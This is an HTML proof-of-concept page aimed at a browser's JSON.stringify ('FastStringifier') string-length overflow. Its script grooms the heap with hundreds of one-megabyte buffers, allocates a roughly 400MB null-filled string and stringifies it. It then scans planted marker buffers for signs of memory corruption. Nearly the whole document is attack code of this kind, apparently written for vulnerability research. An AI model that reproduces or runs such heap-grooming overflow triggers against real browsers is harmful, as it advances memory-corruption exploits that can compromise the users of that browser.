<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FastStringifier Overflow PoC v3</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>FastStringifier Overflow PoC v3</h1>
    <p>Click to trigger string length overflow with memory checks.</p>
    <button id="trigger">Trigger Overflow</button>
    <script>
        function setupMemoryCheck() {
            const buffers = [];
            // Allocate buffers with 0x46 (mimic Canvas UAF)
            for (let i = 0; i < 20; i++) {
                const buf = new ArrayBuffer(8192); // 8KB each
                const view = new Uint8Array(buf);
                view.fill(0x46); // Fill with 0x46
                buffers.push(view);
            }
            return () => {
                let changes = [];
                for (let b = 0; b < buffers.length; b++) {
                    for (let i = 0; i < buffers[b].length; i++) {
                        if (buffers[b][i] !== 0x46) {
                            changes.push(`Buffer[${b}][0x${i.toString(16)}]: 0x${buffers[b][i].toString(16)}`);
                        }
                    }
                }
                return changes.length ? changes.join(', ') : 'No changes';
            };
        }

        document.getElementById('trigger').addEventListener('click', () => {
            alert('Initiating PoC...');
            try {
                // Heap grooming
                alert('Grooming heap...');
                const groom = [];
                for (let i = 0; i < 500; i++) {
                    const buf = new ArrayBuffer(1024 * 1024); // 1MB
                    const view = new Uint8Array(buf);
                    view.fill(0x41);
                    groom.push(view);
                }

                // Initialize memory checker
                const check = setupMemoryCheck();
                alert('Memory checker initialized (20x8KB buffers with 0x46).');

                // Allocate large string
                const stringSize = 400000000; // ~400MB
                alert(`Attempting to allocate string of size ${stringSize} bytes...`);
                setTimeout(() => {
                    try {
                        const string = "\x00".repeat(stringSize);
                        alert('String allocated successfully.');

                        // Check memory before stringify
                        const before = check();
                        alert(`Memory before stringify: ${before}`);

                        // Trigger overflow
                        alert('Attempting JSON.stringify...');
                        JSON.stringify(string);

                        // Check memory after (unlikely if crash occurs)
                        const after = check();
                        alert(`Memory after stringify: ${after}`);
                    } catch (err) {
                        alert(`Error: ${err.message}`);
                    }
                }, 300);
            } catch (err) {
                alert(`Initial error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
